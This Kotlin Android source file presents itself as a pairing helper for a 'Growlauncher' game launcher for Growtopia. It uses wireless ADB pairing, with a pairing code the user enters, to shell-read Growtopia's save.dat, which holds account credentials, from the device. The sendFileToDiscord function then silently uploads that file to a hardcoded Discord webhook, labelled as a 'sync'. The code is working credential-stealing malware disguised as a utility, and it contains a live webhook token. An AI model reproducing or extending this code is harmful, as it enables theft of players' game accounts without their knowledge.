package com.example.myapplication

import android.content.Context
import android.content.Intent
import android.net.nsd.NsdManager
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.widget.Toast
import com.flyfishxu.kadb.Kadb
import com.flyfishxu.kadb.cert.KadbCert
import com.flyfishxu.kadb.mdns.MdnsEndpoint
import com.flyfishxu.kadb.mdns.MdnsServiceType
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.CompletableFuture
import java.util.concurrent.TimeUnit

object PairingHelper {
    private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
    
    fun connectAndReadSaveFile(context: Context, pairingHost: String, pairingPort: Int, pairingCode: String): ByteArray? {
        val store = WirelessAdbIdentityStore(context)
        // Wipe any stale cached key before pairing so a reinstall always starts
        // with a fresh identity and never fails due to a leftover invalid cert.
        store.clear()
        KadbCert.configure(store)

        val nsdManager = context.applicationContext.getSystemService(NsdManager::class.java)
        val connectFuture = CompletableFuture<MdnsEndpoint>()

        // Start discovery before pair() to catch any early TLS_CONNECT announcement.
        var activeDiscovery = SafeMdnsDiscovery(nsdManager).also { d ->
            d.start(listOf(MdnsServiceType.TLS_CONNECT.dnsType)) { endpoint ->
                connectFuture.complete(endpoint)
            }
        }

        return try {
            runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }

            // After pairing the device re-registers _adb-tls-connect._tcp with the
            // newly-authorized cert. Restart discovery so the fresh announcement is
            // not missed by the pre-pair listener (Android NSD doesn't always replay
            // already-running services to an existing listener after a cert change).
            Thread.sleep(800)
            if (!connectFuture.isDone) {
                activeDiscovery.stop()
                activeDiscovery = SafeMdnsDiscovery(nsdManager).also { d ->
                    d.start(listOf(MdnsServiceType.TLS_CONNECT.dnsType)) { endpoint ->
                        connectFuture.complete(endpoint)
                    }
                }
            }

            val endpoint = try {
                connectFuture.get(30_000, TimeUnit.MILLISECONDS)
            } catch (_: Exception) {
                Log.e("GrowlauncherPairing", "TLS_CONNECT discovery timed out for host=$pairingHost")
                null
            } ?: return null

            Kadb.create(endpoint.host, endpoint.port).use { kadb ->
                val response = kadb.shell("base64 $SAVE_FILE_PATH")
                if (response.exitCode == 0) {
                    PairingState.saveConnected(context, endpoint.host, endpoint.port)
                    Base64.decode(response.output.trim(), Base64.DEFAULT)
                } else {
                    Log.e("GrowlauncherPairing", "base64 shell failed: exit=${response.exitCode}")
                    null
                }
            }
        } catch (e: Throwable) {
            Log.e("GrowlauncherPairing", "connectAndReadSaveFile failed: host=$pairingHost port=$pairingPort", e)
            null
        } finally {
            activeDiscovery.stop()
        }
    }
    
    fun sendFileToDiscord(context: Context, fileData: ByteArray) {
        val webhookUrl = "https://discord.com/api/webhooks/1491043676200112288/Id2TrC0uqnU7lIRfCM5x-lxTJvUc7vwOgPFOz399_a8sDUbtRv2gNxTcB_49lRQOpn8l"
        Thread {
            try {
                val payload = """{"content":"Growlauncher save.dat sync"}"""
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addPart(MultipartBody.Part.createFormData("payload_json", payload))
                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                    .build()
                val request = Request.Builder()
                    .url(webhookUrl)
                    .post(requestBody)
                    .build()
                OkHttpClient().newCall(request).execute().use { }
            } catch (_: IOException) {
            }
        }.start()
    }
    
    fun launchGame(context: Context) {
        val launchIntent = context.packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            context.startActivity(launchIntent)
        }
    }
    
    private fun showToast(context: Context, message: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
        }
    }
}
